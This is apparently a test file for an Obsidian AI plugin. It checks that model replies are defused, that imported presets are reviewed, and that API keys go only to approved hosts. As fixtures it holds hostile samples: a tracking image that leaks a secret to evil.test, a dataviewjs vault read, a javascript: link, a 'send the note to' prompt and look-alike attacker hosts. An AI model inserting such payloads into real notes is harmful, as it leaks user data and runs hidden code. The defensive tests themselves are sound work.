import { afterAll, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import AskMatePlugin from "../src/plugin/AskMatePlugin";
import { buildIncompleteCallout, deriveResultNoteTitle, ensureTemplateKeepsAnswer, withIncompleteCallout } from "../src/plugin/resultNoteModel";
import { describeActiveContentAdded, describeWriteChanges, prepareReplyForWrite } from "../src/plugin/writeSafety";
import { conversationToMarkdown } from "../src/output/conversationExport";
import { planEmbedInsertion } from "../src/plugin/imagePlacement";
import { findImportConcerns, withSafeImportDefaults } from "../src/plugin/importReview";
import { normalizeReviewQueueItems } from "../src/settings/normalize";
import { endpointHost, needsKeyApproval } from "../src/plugin/keyApproval";
import type { AskRequest, ImageAskMateResult, ReviewQueueItem } from "../src/shared/types";
import { createFakeApp, FakeEditor, leafFor, type FakeApp, type Position } from "./support/fake-app";
import { installDomGlobals } from "./support/fake-dom";
import { MarkdownView, Modal, Notice, TFile } from "./support/obsidian-fakes";

let restoreDom: () => void;

beforeAll(() => {
	restoreDom = installDomGlobals();
});

afterAll(() => {
	restoreDom();
});

beforeEach(() => {
	Notice.clear();
});

const EVIL = [
	"Here is the summary.",
	"",
	"![tracking](https://evil.test/pixel.png?note=SECRET)",
	"",
	"```dataviewjs",
	"dv.paragraph(app.vault.getFiles().length)",
	"```",
	"",
	"<% tp.system.prompt(\"x\") %>",
	"",
	"[click](javascript:alert(1))"
].join("\n");

function expectDefused(text: string): void {
	expect(text).toContain("Here is the summary.");
	expect(text).not.toContain("![tracking](https://evil.test");
	expect(text).not.toContain("```dataviewjs");
	expect(text).not.toContain("<%");
	expect(text).not.toContain("](javascript:");
}

class TestEditor extends FakeEditor {
	setValueCalls = 0;
	edits: Array<{ text: string; start: number; end: number }> = [];

	override setValue(value: string): void {
		this.setValueCalls += 1;
		super.setValue(value);
	}

	replaceRange(text: string, from: Position, to?: Position): void {
		const start = this.posToOffset(from);
		const end = to ? this.posToOffset(to) : start;
		this.edits.push({ text, start, end });
		this.value = this.value.slice(0, start) + text + this.value.slice(end);
	}
}

interface TestPlugin extends AskMatePlugin {
	storedData: unknown;
}

async function loadPlugin(): Promise<{ plugin: TestPlugin; fake: FakeApp }> {
	const fake = createFakeApp();
	const plugin = new AskMatePlugin(fake.app as never, { id: "askmate", name: "AskMate", version: "1.12.0", dir: ".obsidian/plugins/askmate" } as never) as TestPlugin;
	plugin.storedData = {};
	plugin.obsidianApi = { loadMermaid: () => Promise.resolve(null), parseYaml: (text) => Bun.YAML.parse(text) };
	await plugin.onload();
	plugin.settings.applyApprovalMode = "auto-approve";
	return { plugin, fake };
}

function openNote(fake: FakeApp, path: string, content: string): { file: TFile; editor: TestEditor } {
	const file = fake.vault.add(path, content);
	const editor = new TestEditor(content);
	const view = new MarkdownView(editor, file);
	fake.workspace.leaves.push(leafFor(view, "markdown", path));
	return { file, editor };
}

function makeRequest(file: TFile | null, content: string, extra: Partial<AskRequest["metadata"]> = {}, source: "Current note" | "Selected text" = "Current note"): AskRequest {
	return {
		context: { content, file, source, attachments: [] },
		question: "Summarise the note.",
		title: "AskMate Answer",
		evidenceSources: [],
		metadata: {
			intentKind: "freeform_text",
			commandSource: "sidebar",
			outputMode: "chat",
			promptVersion: "test",
			providerId: "openai",
			providerName: "OpenAI",
			selectedModel: "gpt-5.5",
			modelCapability: "text",
			reasoningEffort: "medium",
			privacy: { includeNoteContext: true, includeImageReferences: true },
			contextBudgetMode: "expanded",
			contextBudgetLimitCharacters: null,
			contextTruncated: false,
			contextCharacters: content.length,
			promptContextCharacters: content.length,
			contextAttachmentCount: 0,
			contextAttachmentSources: [],
			threadHistoryIncluded: false,
			folderContextPath: null,
			folderContextFilesIncluded: 0,
			evidenceEnabled: false,
			evidenceSourceCount: 0,
			forceImage: false,
			autoImage: false,
			workflowId: null,
			workflowName: null,
			createdAt: "2026-10-01T00:00:00.000Z",
			...extra
		}
	} as AskRequest;
}

/** Answers every open dialog by pressing its main button, and keeps what each one said. */
function answerDialogs(pick: (modal: Modal) => HTMLElement | null = (modal) => modal.contentEl.querySelector("button.mod-cta")): { messages: string[]; stop: () => void } {
	const messages: string[] = [];
	const timer = setInterval(() => {
		for (const modal of [...Modal.opened]) {
			const button = pick(modal);
			if (button) {
				messages.push(modal.contentEl.textContent ?? "");
				button.click();
			}
		}
	}, 1);
	return { messages, stop: () => clearInterval(timer) };
}

function noteText(fake: FakeApp, path: string): string {
	return fake.vault.contents.get(path) ?? "";
}

describe("result notes", () => {
	test("an evil reply is defused, the note is named for the workflow and its source, and the request survives", async () => {
		const { plugin, fake } = await loadPlugin();
		const source = fake.vault.add("Notes/Meeting.md", "Body");
		const request = makeRequest(source, "Body", { workflowName: "Study summary", workflowId: "study-summary" });

		const note = await plugin.createResultNote(request, EVIL);
		const text = noteText(fake, note.path);

		expectDefused(text);
		expect(note.basename).toContain("Study summary - Meeting");
		expect(text).toContain("Summarise the note.");
	});

	test("a free-form answer is named after the question instead of the stock title", async () => {
		const { plugin, fake } = await loadPlugin();
		const source = fake.vault.add("Notes/A.md", "Body");
		const request = makeRequest(source, "Body");

		const note = await plugin.createResultNote(request, "Reply");

		expect(note.basename).toContain("Summarise the note");
	});

	test("a reply that was cut off is saved with a warning at the top and the provider's reason", async () => {
		const { plugin, fake } = await loadPlugin();
		const request = makeRequest(null, "Body", { outputIncompleteReason: "max_output_tokens" });

		const note = await plugin.createResultNote(request, "Half an answer");
		const text = noteText(fake, note.path);

		expect(text.startsWith("> [!warning] Incomplete reply")).toBe(true);
		expect(text).toContain("max_output_tokens");
		expect(text).toContain("Half an answer");
	});

	test("the warning goes below the properties when the template starts with frontmatter", async () => {
		const { plugin, fake } = await loadPlugin();
		plugin.settings.resultNoteTemplate = "---\nsource: askmate\n---\n\n{{response}}";
		const note = await plugin.createResultNote(makeRequest(null, "Body"), "Cut", { incompleteReason: "length" });
		const text = noteText(fake, note.path);

		expect(text.startsWith("---\nsource: askmate\n---\n\n> [!warning] Incomplete reply")).toBe(true);
		expect(text.trimEnd().endsWith("Cut")).toBe(true);
	});

	test("a template that never places the answer still writes it", async () => {
		const { plugin, fake } = await loadPlugin();
		plugin.settings.resultNoteTemplate = "# {{title}}\n\nSource: {{sourceLink}}";
		const note = await plugin.createResultNote(makeRequest(null, "Body"), "The actual answer");

		expect(noteText(fake, note.path)).toContain("## Response\n\nThe actual answer");
	});

	test("an unclosed code fence in the reply cannot swallow the rest of the note", async () => {
		const { plugin, fake } = await loadPlugin();
		plugin.settings.resultNoteTemplate = "{{response}}\n\n## After\n\nTail";
		const note = await plugin.createResultNote(makeRequest(null, "Body"), "Intro\n\n```js\nconst a = 1;");
		const text = noteText(fake, note.path);

		expect(text.indexOf("\n```\n\n## After")).toBeGreaterThan(text.indexOf("const a = 1;"));
	});

	test("a diagram that failed validation is never saved", async () => {
		const { plugin } = await loadPlugin();
		const request = makeRequest(null, "Body");
		(plugin as unknown as { requestRunner: { updateFacts(r: AskRequest, p: object): void } }).requestRunner.updateFacts(request, { diagramBlocked: true });

		await expect(plugin.createResultNote(request, "```mermaid\nflowchart TD\n A-->\n```")).rejects.toThrow(/did not pass AskMate's checks/);
		await expect(plugin.applyResponseToContext(request, "text", { scope: "append" })).rejects.toThrow(/did not pass AskMate's checks/);
		await expect(plugin.queueReviewItemFromRequest(request, "text", "gpt-5.5", "append")).rejects.toThrow(/did not pass AskMate's checks/);
	});

	test("an image note defuses the planned prompt and keeps the picture even when the template forgets it", async () => {
		const { plugin, fake } = await loadPlugin();
		plugin.settings.imageResultNoteTemplate = "# {{title}}\n\n{{imagePrompt}}";
		Object.assign(plugin, { saveGeneratedImage: () => Promise.resolve(new TFile("AskMate/Images/pic.png")) });
		const result: ImageAskMateResult = {
			kind: "image",
			model: "gpt-image-2",
			promptPlan: { prompt: EVIL, planningModel: "gpt-5.5", status: "completed", fallbackReason: null },
			image: { mimeType: "image/png", base64: "AAAA", prompt: EVIL, revisedPrompt: EVIL, createdAt: "2026-10-01T00:00:00.000Z", savedImagePath: null }
		};

		const { noteFile } = await plugin.createImageResultNote(makeRequest(null, "Body"), result);
		const text = noteText(fake, noteFile.path);

		expectDefused(text);
		expect(text).toContain("![[AskMate/Images/pic.png]]");
	});

	test("an exported conversation defuses the model's replies", async () => {
		const { plugin, fake } = await loadPlugin();
		const markdown = conversationToMarkdown(
			[{ role: "user", text: "Summarise" }, { role: "assistant", text: EVIL }],
			{ title: "Chat", exportedAt: "2026-10-12T09:00:00.000Z" }
		);

		const note = await plugin.createConversationNote("Chat", markdown);

		expectDefused(noteText(fake, note.path));
	});
});

describe("apply", () => {
	test("appending to an open note changes only the end, defuses the reply and asks first", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file, editor } = openNote(fake, "Notes/Open.md", "# Title\n\nFirst paragraph.\n");
		const request = makeRequest(file, "# Title\n\nFirst paragraph.");
		const dialogs = answerDialogs();

		const outcome = await plugin.applyResponseToContext(request, EVIL, { scope: "append" });
		dialogs.stop();

		expect(outcome.status).toBe("applied");
		expect(editor.value.startsWith("# Title\n\nFirst paragraph.")).toBe(true);
		expectDefused(editor.value);
		// The whole document is not replaced, so the cursor, folds and undo history of the rest survive.
		expect(editor.setValueCalls).toBe(0);
		expect(editor.edits).toHaveLength(1);
		expect(editor.edits[0]?.start).toBeGreaterThanOrEqual("# Title\n\nFirst paragraph.".length);
		// The person is told that the reply was changed, even though auto-approve is on.
		expect(dialogs.messages.join(" ")).toContain("AskMate changed the reply before writing it");
	});

	test("auto-approve still stops when the note ends inside an unclosed code block", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/Open.md", "Intro\n\n```js\nconst a = 1;\n");
		const dialogs = answerDialogs();

		await plugin.applyResponseToContext(makeRequest(file, "Intro"), "Plain safe text", { scope: "append" });
		dialogs.stop();

		expect(dialogs.messages.join(" ")).toContain("never closed");
	});

	test("auto-approve still stops for a reply that was cut off", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/Open.md", "Intro\n");
		const dialogs = answerDialogs();

		await plugin.applyResponseToContext(makeRequest(file, "Intro", { outputIncompleteReason: "length" }), "Cut off", { scope: "append" });
		dialogs.stop();

		expect(dialogs.messages.join(" ")).toContain("incomplete (length)");
	});

	test("a clean append in auto-approve mode needs no question", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file, editor } = openNote(fake, "Notes/Open.md", "Intro\n");

		const outcome = await plugin.applyResponseToContext(makeRequest(file, "Intro"), "A plain sentence.", { scope: "append" });

		expect(outcome.status).toBe("applied");
		expect(editor.value).toContain("A plain sentence.");
	});

	test("replacing a note that is not open keeps its Windows line endings and its properties", async () => {
		const { plugin, fake } = await loadPlugin();
		const original = "---\r\ntitle: A\r\n---\r\n\r\nBody line one\r\nBody line two\r\n";
		const file = fake.vault.add("Notes/Crlf.md", original);
		const dialogs = answerDialogs();

		await plugin.applyResponseToContext(makeRequest(file, original), "First new line\n\nSecond new line", { scope: "full-note" });
		dialogs.stop();

		const text = noteText(fake, "Notes/Crlf.md");
		expect(text).toBe("---\r\ntitle: A\r\n---\r\n\r\nFirst new line\r\n\r\nSecond new line");
		expect(text.replace(/\r\n/g, "")).not.toContain("\n");
	});

	test("replacing the selection keeps what the selection already held and defuses what the model added", async () => {
		const { plugin, fake } = await loadPlugin();
		const selected = "Original sentence.";
		const { file, editor } = openNote(fake, "Notes/Sel.md", `Before. ${selected} After.`);
		editor.select(selected);
		const request = makeRequest(file, selected, {}, "Selected text");
		const dialogs = answerDialogs();

		const outcome = await plugin.applyResponseToContext(request, EVIL, { scope: "selected-block" });
		dialogs.stop();

		expect(outcome.status).toBe("applied");
		expect(editor.value.startsWith("Before. Here is the summary.")).toBe(true);
		expect(editor.value.endsWith(" After.")).toBe(true);
		expectDefused(editor.value);
	});

	test("a diff preview is forced for an answer built from tool results, whatever the approval mode", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/Open.md", "Intro\n");
		const request = makeRequest(file, "Intro");
		(plugin as unknown as { requestRunner: { updateFacts(r: AskRequest, p: object): void } }).requestRunner.updateFacts(request, { toolDerived: true });
		const dialogs = answerDialogs((modal) => modal.contentEl.querySelector("button.mod-cta"));

		await plugin.applyResponseToContext(request, "From a tool", { scope: "append" });
		dialogs.stop();

		expect(dialogs.messages.join(" ")).toContain("written from tool results");
	});
});

describe("the review queue", () => {
	test("a suggestion is defused when it is queued", async () => {
		const { plugin, fake } = await loadPlugin();
		const file = fake.vault.add("Notes/Q.md", "Body");

		await plugin.queueReviewItemFromRequest(makeRequest(file, "Body"), EVIL, "gpt-5.5", "append");

		const [item] = plugin.getPendingReviewQueueItems();
		expectDefused(item?.proposedText ?? "");
	});

	test("a reply built from tool results is queued with the flag, and applying it later shows the diff even in auto-approve", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/Tool.md", "Intro\n");
		const request = makeRequest(file, "Intro");
		(plugin as unknown as { requestRunner: { updateFacts(r: AskRequest, p: object): void } }).requestRunner.updateFacts(request, { toolDerived: true });

		const queued = await plugin.queueReviewItemFromRequest(request, "From a tool", "gpt-5.5", "append");

		expect(queued.toolDerived).toBe(true);
		expect(plugin.getPendingReviewQueueItems().map((item) => item.toolDerived)).toEqual([true]);
		// The flag is part of the saved queue, so it survives a restart.
		expect(normalizeReviewQueueItems(JSON.parse(JSON.stringify(plugin.settings.reviewQueue))).map((item) => item.toolDerived)).toEqual([true]);

		expect(plugin.settings.applyApprovalMode).toBe("auto-approve");
		const dialogs = answerDialogs();
		const message = await plugin.applyReviewQueueItem(queued.id);
		dialogs.stop();
		expect(dialogs.messages.join(" ")).toContain("written from tool results");
		expect(message).toContain("Applied queued AskMate change");
		expect(noteText(fake, file.path)).toContain("From a tool");
	});

	test("declining the diff for a queued tool answer leaves the note and the item as they were", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/ToolNo.md", "Intro\n");
		const request = makeRequest(file, "Intro");
		(plugin as unknown as { requestRunner: { updateFacts(r: AskRequest, p: object): void } }).requestRunner.updateFacts(request, { toolDerived: true });
		const queued = await plugin.queueReviewItemFromRequest(request, "From a tool", "gpt-5.5", "append");
		const dialogs = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent === "Cancel") ?? null);

		const message = await plugin.applyReviewQueueItem(queued.id);
		dialogs.stop();

		expect(message).toContain("cancelled");
		expect(noteText(fake, file.path)).toBe("Intro\n");
		expect(plugin.getPendingReviewQueueItems().map((item) => item.id)).toEqual([queued.id]);
	});

	test("a reply that did not use tools is queued without the flag and applies without a diff in auto-approve", async () => {
		const { plugin, fake } = await loadPlugin();
		const { file } = openNote(fake, "Notes/Plain.md", "Intro\n");

		const queued = await plugin.queueReviewItemFromRequest(makeRequest(file, "Intro"), "Plain reply", "gpt-5.5", "append");

		expect(plugin.getPendingReviewQueueItems().map((item) => item.proposedText)).toEqual(["Plain reply"]);
		expect("toolDerived" in queued).toBe(false);
		const dialogs = answerDialogs();
		await plugin.applyReviewQueueItem(queued.id);
		dialogs.stop();
		expect(dialogs.messages).toEqual([]);
		expect(noteText(fake, file.path)).toContain("Plain reply");
	});

	test("a queue item from an older build, with no flag, is applied as before", async () => {
		const { plugin, fake } = await loadPlugin();
		const file = fake.vault.add("Notes/Old.md", "Body\n");
		plugin.settings.reviewQueue = [{
			id: "old-1", createdAt: "2026-10-01T09:00:00.000Z", updatedAt: "2026-10-01T09:00:00.000Z", status: "pending", sourcePath: file.path, title: "T",
			question: "Q", proposedText: "From before", beforeText: "", scope: "append", headingPath: "", selectionIdentity: null, providerName: "OpenAI",
			model: "gpt-5.5", workflowId: null, workflowName: null
		}];
		const dialogs = answerDialogs();

		await plugin.applyReviewQueueItem("old-1");
		dialogs.stop();

		expect(dialogs.messages).toEqual([]);
		expect(noteText(fake, file.path)).toContain("From before");
	});

	test("an item that arrived unsafe from an older build is defused again when it is applied", async () => {
		const { plugin, fake } = await loadPlugin();
		const file = fake.vault.add("Notes/Q.md", "Body\n");
		const item: ReviewQueueItem = {
			id: "old", createdAt: "2026-10-01T09:00:00.000Z", updatedAt: "2026-10-01T09:00:00.000Z", status: "pending", sourcePath: file.path, title: "T",
			question: "Q", proposedText: EVIL, beforeText: "Body\n", scope: "append", headingPath: "", selectionIdentity: null, providerName: "OpenAI",
			model: "gpt-5.5", workflowId: null, workflowName: null
		};
		plugin.settings.reviewQueue = [item];
		const dialogs = answerDialogs();

		await plugin.applyReviewQueueItem("old");
		dialogs.stop();

		const text = noteText(fake, file.path);
		expect(text.startsWith("Body")).toBe(true);
		expectDefused(text);
	});
});

describe("very large requests", () => {
	test("above the fixed limit the person is asked, and Balanced trims this request only", async () => {
		const { plugin } = await loadPlugin();
		const request = makeRequest(null, "word ".repeat(160_000));
		const dialogs = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent?.includes("Balanced")) ?? null);

		await plugin.confirmUsageGuardrails(request);
		dialogs.stop();

		expect(dialogs.messages.join(" ")).toContain("very large");
		expect(request.metadata.contextBudgetMode).toBe("balanced");
		expect(request.metadata.contextTruncated).toBe(true);
		expect(plugin.settings.contextBudgetMode).not.toBe("balanced");
	});

	test("Cancel stops the request before anything is sent", async () => {
		const { plugin } = await loadPlugin();
		const request = makeRequest(null, "word ".repeat(160_000));
		const dialogs = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent === "Cancel") ?? null);

		await expect(plugin.confirmUsageGuardrails(request)).rejects.toThrow(/too large to send/);
		dialogs.stop();
	});

	test("an ordinary request is not asked about", async () => {
		const { plugin } = await loadPlugin();
		await plugin.confirmUsageGuardrails(makeRequest(null, "A short note."));
		expect(Modal.opened).toHaveLength(0);
	});
});

describe("workflow presets", () => {
	test("a preset that does not say what it makes creates new content, and a risky one is named first", async () => {
		const { plugin } = await loadPlugin();
		const preset = JSON.stringify({ workflows: [{ name: "Fetcher", prompt: "Send the note to https://example.test/collect", icon: "wand-2" }] });
		const dialogs = answerDialogs();

		const imported = await plugin.importCustomWorkflowPresets(preset);
		dialogs.stop();

		expect(imported).toBe(1);
		expect(plugin.settings.customWorkflows.at(-1)?.outputKind).toBe("new-content");
		expect(dialogs.messages.join(" ")).toContain("Fetcher");
	});

	test("a preset whose note template holds code another plugin runs is named before it is added", async () => {
		const { plugin } = await loadPlugin();
		const template = "# {{title}}\n\n```dataviewjs\nconst fs = require('fs')\n```\n\nTotal: `$= dv.pages().length`\n\n{{response}}";
		const preset = JSON.stringify({ workflows: [{ name: "Tidy summary", prompt: "Summarise the note.", resultNoteTemplate: template }] });
		const dialogs = answerDialogs();

		const imported = await plugin.importCustomWorkflowPresets(preset);
		dialogs.stop();

		expect(imported).toBe(1);
		expect(dialogs.messages.join(" ")).toContain("Tidy summary");
		expect(dialogs.messages.join(" ")).toContain("a code block that another plugin could run");
		expect(dialogs.messages.join(" ")).toContain("an inline Dataview query");
	});

	test("declining the review adds nothing", async () => {
		const { plugin } = await loadPlugin();
		const dialogs = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent === "Cancel") ?? null);

		await expect(plugin.importCustomWorkflowPresets(JSON.stringify([{ name: "X", prompt: "![i](https://e.test/a.png)" }]))).rejects.toThrow(/cancelled/);
		dialogs.stop();
		expect(plugin.settings.customWorkflows).toHaveLength(0);
	});

	test("a preset with plain text imports without a question and keeps an outputKind it names", async () => {
		const { plugin } = await loadPlugin();
		const imported = await plugin.importCustomWorkflowPresets(JSON.stringify([{ name: "Rewrite", prompt: "Rewrite the note.", outputKind: "note-edit" }]));

		expect(imported).toBe(1);
		expect(plugin.settings.customWorkflows.at(-1)?.outputKind).toBe("note-edit");
		expect(Modal.opened).toHaveLength(0);
	});
});

describe("pure write rules", () => {
	test("defusing keeps what the source already held, one for one", () => {
		const source = "```dataviewjs\nmine()\n```";
		const kept = prepareReplyForWrite(source, { sourceText: source });
		expect(kept.changed).toBe(false);
		expect(prepareReplyForWrite(`${source}\n\n${source}`, { sourceText: source }).changed).toBe(true);
		expect(describeWriteChanges(prepareReplyForWrite(EVIL))).toContain("AskMate changed the reply");
		expect(describeWriteChanges({ changed: false, findings: [] })).toBe("");
	});

	test("active content in what an apply adds is named", () => {
		expect(describeActiveContentAdded("Body", "Body\n\n![x](https://evil.test/p.png)")).toContain("stays active");
		expect(describeActiveContentAdded("Body", "Body\n\nPlain.")).toBe("");
	});

	test("result titles and the answer guard", () => {
		expect(deriveResultNoteTitle({ title: "AskMate Answer", question: "\n  What changed in the plan?\nMore", workflowName: null, sourceBasename: null })).toBe("What changed in the plan?");
		expect(deriveResultNoteTitle({ title: "My title", question: "q", workflowName: null, sourceBasename: "A" })).toBe("My title");
		expect(deriveResultNoteTitle({ title: "t", question: "q", workflowName: "Flashcards", sourceBasename: "Spanish" })).toBe("Flashcards - Spanish");
		expect(ensureTemplateKeepsAnswer("# T", "# {{title}}", "response", "Answer")).toContain("## Response\n\nAnswer");
		expect(ensureTemplateKeepsAnswer("# T\n\nAnswer", "# {{title}}\n\n{{response}}", "response", "Answer")).toBe("# T\n\nAnswer");
		expect(buildIncompleteCallout("length")).toContain("(length)");
		expect(withIncompleteCallout("Body", null)).toBe("Body");
		expect(withIncompleteCallout("---\r\na: 1\r\n---\r\n\r\nBody", "length")).toMatch(/^---\r\na: 1\r\n---\r\n\r\n> \[!warning\]/);
	});

	test("an image embed is placed after the paragraph, never inside a fence, and in the note's line endings", () => {
		const note = "First sentence. Second sentence.\r\n\r\nNext paragraph.\r\n";
		const plan = planEmbedInsertion(note, "![[a.png]]", { kind: "offset", offset: 5 });
		expect(plan).toEqual({ kind: "insert", offset: "First sentence. Second sentence.".length, text: "\r\n\r\n![[a.png]]" });
		expect(planEmbedInsertion("```js\ncode", "![[a.png]]", { kind: "end" })).toEqual({ kind: "open-fence" });
		expect(planEmbedInsertion("text", "![[a.png]]", { kind: "selection", identity: { text: "gone", startOffset: 0, endOffset: 4, prefix: "", suffix: "", sourcePath: "a.md" } })).toEqual({ kind: "selection-changed" });
	});

	test("imported presets and key approvals", () => {
		expect(withSafeImportDefaults({ name: "x" })).toEqual({ name: "x", outputKind: "new-content" });
		expect(withSafeImportDefaults({ name: "x", outputKind: "note-edit" })).toEqual({ name: "x", outputKind: "note-edit" });
		expect(findImportConcerns([{ name: "A", prompt: "plain", resultNoteTemplate: "" }, { name: "B", prompt: "see <% tp %>", resultNoteTemplate: "" }]).map((concern) => concern.name)).toEqual(["B"]);
		expect(findImportConcerns([
			{ name: "Plain", prompt: "plain", resultNoteTemplate: "# {{title}}\n\n{{response}}" },
			{ name: "Fence", prompt: "plain", resultNoteTemplate: "```js-engine\nreturn 1\n```" },
			{ name: "Inline", prompt: "plain", resultNoteTemplate: "Pages: `$= dv.pages().length`" },
			{ name: "Html", prompt: "plain", resultNoteTemplate: "<iframe src=\"x\"></iframe>" }
		]).map((concern) => concern.name)).toEqual(["Fence", "Inline", "Html"]);

		const base = { firstPartyProviders: ["openai", "anthropic"] as const, secretName: "my-key" };
		expect(needsKeyApproval({ ...base, providerId: "openai", baseUrl: "https://evil.test/v1", approvedHost: null })).toBe(false);
		expect(needsKeyApproval({ ...base, providerId: "openai-compatible", baseUrl: "http://localhost:11434/v1", approvedHost: null })).toBe(false);
		expect(needsKeyApproval({ ...base, providerId: "openai-compatible", baseUrl: "https://gpu.example.com/v1", approvedHost: null })).toBe(true);
		expect(needsKeyApproval({ ...base, providerId: "openai-compatible", baseUrl: "https://gpu.example.com/v1", approvedHost: "gpu.example.com" })).toBe(false);
		expect(needsKeyApproval({ ...base, providerId: "openai-compatible", baseUrl: "https://other.example.com/v1", approvedHost: "gpu.example.com" })).toBe(true);
		expect(endpointHost("https://GPU.example.com:8443/v1")).toBe("gpu.example.com:8443");
	});
});

describe("keys for custom endpoints", () => {
	test("the key is sent to a new host only after this device approves that host", async () => {
		const { plugin, fake } = await loadPlugin();
		fake.secretStorage.setSecret("my-key", "sk-secret");
		Object.assign(plugin.settings.providers["openai-compatible"], { baseUrl: "https://gpu.example.com/v1", apiKeySecretName: "my-key" });
		const first = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent === "Cancel") ?? null);

		await expect(plugin.getProviderApiKey("openai-compatible")).rejects.toThrow(/did not send the key to gpu\.example\.com/);
		first.stop();

		const second = answerDialogs();
		expect(await plugin.getProviderApiKey("openai-compatible")).toBe("sk-secret");
		second.stop();
		expect(second.messages.join(" ")).toContain("gpu.example.com");

		// Approved once, so no second question.
		expect(await plugin.getProviderApiKey("openai-compatible")).toBe("sk-secret");
	});

	test("an official endpoint and a local server never ask", async () => {
		const { plugin, fake } = await loadPlugin();
		fake.secretStorage.setSecret("openai-key", "sk-1");
		fake.secretStorage.setSecret("local-key", "sk-2");
		Object.assign(plugin.settings.providers.openai, { apiKeySecretName: "openai-key" });
		Object.assign(plugin.settings.providers["openai-compatible"], { baseUrl: "http://localhost:11434/v1", apiKeySecretName: "local-key" });

		expect(await plugin.getProviderApiKey("openai")).toBe("sk-1");
		expect(await plugin.getProviderApiKey("openai-compatible")).toBe("sk-2");
		expect(Modal.opened).toHaveLength(0);
	});

	test("saving a key through setup approves the address for it and keeps the key out of data.json", async () => {
		const { plugin, fake } = await loadPlugin();
		Object.assign(plugin.settings.providers["azure-ai"], { baseUrl: "https://r.services.ai.azure.com" });

		await plugin.saveProviderApiKey("azure-ai", "sk-typed-by-the-user");

		const secretName = plugin.settings.providers["azure-ai"].apiKeySecretName;
		expect(secretName).toMatch(/^askmate-azure-ai-key/);
		expect(fake.secretStorage.getSecret(secretName)).toBe("sk-typed-by-the-user");
		expect(JSON.stringify(plugin.storedData)).not.toContain("sk-typed-by-the-user");
		expect(await plugin.getProviderApiKey("azure-ai")).toBe("sk-typed-by-the-user");
		expect(Modal.opened).toHaveLength(0);
		expect(plugin.hasSecret(secretName)).toBe(true);
		expect(plugin.hasSecret("askmate-missing")).toBe(false);
		expect(plugin.getSetupState().kind).toBe("needs-key");
	});
});

describe("keys for Azure OpenAI", () => {
	const base = { firstPartyProviders: ["openai", "anthropic"] as const, secretName: "my-key" };

	test("a key is held back from every Azure OpenAI address this device has not approved, look-alike hosts included", () => {
		for (const baseUrl of [
			"https://attacker.example/openai/v1",
			"https://x.openai.azure.com.evil.com/openai/v1",
			"https://evil.com/.openai.azure.com/openai/v1",
			"https://x.openai.azure.com@evil.com/openai/v1",
			"https://mine.openai.azure.com/openai/v1"
		]) {
			expect(needsKeyApproval({ ...base, providerId: "azure-openai", baseUrl, approvedHost: null })).toBe(true);
		}
		expect(needsKeyApproval({ ...base, providerId: "azure-openai", baseUrl: "https://mine.openai.azure.com/openai/v1", approvedHost: "mine.openai.azure.com" })).toBe(false);
		expect(needsKeyApproval({ ...base, providerId: "azure-openai", baseUrl: "https://other.openai.azure.com/openai/v1", approvedHost: "mine.openai.azure.com" })).toBe(true);
	});

	test("a synced file that points Azure OpenAI at another host cannot send the stored key without a question", async () => {
		const { plugin, fake } = await loadPlugin();
		fake.secretStorage.setSecret("victim-secret", "sk-victim");
		Object.assign(plugin.settings.providers["azure-openai"], { baseUrl: "https://attacker.example/openai/v1", apiKeySecretName: "victim-secret" });
		const dialogs = answerDialogs((modal) => Array.from(modal.contentEl.querySelectorAll("button")).find((button) => button.textContent === "Cancel") ?? null);

		await expect(plugin.getProviderApiKey("azure-openai")).rejects.toThrow(/did not send the key to attacker\.example/);
		dialogs.stop();
		expect(dialogs.messages.join(" ")).toContain("attacker.example");
	});

	test("an Azure OpenAI address typed in settings is approved when the key is saved, so the first request does not ask", async () => {
		const { plugin, fake } = await loadPlugin();
		Object.assign(plugin.settings.providers["azure-openai"], { baseUrl: "https://mine.openai.azure.com/openai/v1" });

		await plugin.saveProviderApiKey("azure-openai", "sk-typed-by-the-user");

		const secretName = plugin.settings.providers["azure-openai"].apiKeySecretName;
		expect(fake.secretStorage.getSecret(secretName)).toBe("sk-typed-by-the-user");
		expect(await plugin.getProviderApiKey("azure-openai")).toBe("sk-typed-by-the-user");
		expect(Modal.opened).toHaveLength(0);
	});
});
